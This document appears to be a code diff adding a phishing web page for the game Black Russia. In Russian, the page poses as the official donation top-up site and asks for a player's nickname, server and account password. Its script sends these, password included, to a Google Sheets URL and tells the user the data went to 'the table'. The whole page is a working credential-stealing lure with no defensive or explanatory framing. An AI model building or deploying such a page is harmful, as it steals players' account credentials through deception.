@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Black Russia Donate</title>
+  <style>
+    body { background: #3a0000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; }
+    .box { background: #1a0000; padding: 40px; border-radius: 16px; max-width: 400px; width: 100%; color: white; box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); text-align: center; }
+    h2 { color: #cc0000; font-size: 28px; }
+    input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 8px; background: #2a0a0a; color: white; font-size: 16px; box-sizing: border-box; border: 1px solid #660000; }
+    button { width: 100%; padding: 16px; background: #cc0000; color: white; font-weight: bold; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
+    .footer { font-size: 13px; color: #884444; margin-top: 20px; }
+  </style>
+</head>
+<body>
+<div class="box">
+  <h2>BLACK RUSSIA DONATE</h2>
+  <form id="brForm">
+    <input type="text" id="nick" placeholder="Игровой ник" required>
+    <input type="text" id="server" placeholder="сервер" required>
+    <input type="password" id="pass" placeholder="Пароль от аккаунта" required>
+    <button type="submit">Пополнить донат</button>
+  </form>
+  <div class="footer">Официальный сайт пополнения</div>
+</div>
+<script>
+document.getElementById('brForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const nick = document.getElementById('nick').value;
+  const server = document.getElementById('server').value;
+  const password = document.getElementById('pass').value;
+  const url = "https://docs.google.com/spreadsheets/d/1-V7aWCRNaQGcTkCIMnc7gssWoe33Bt3lSTjrjYMXf8U/edit?usp=drivesdk";
+
+  fetch(url, {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ nick, server, password })
+  })
+  .then(() => alert("✅ Данные отправлены в таблицу!"))
+  .catch(() => alert("❌ Ошибка отправки"));
+});
+</script>
+</body>
+</html>
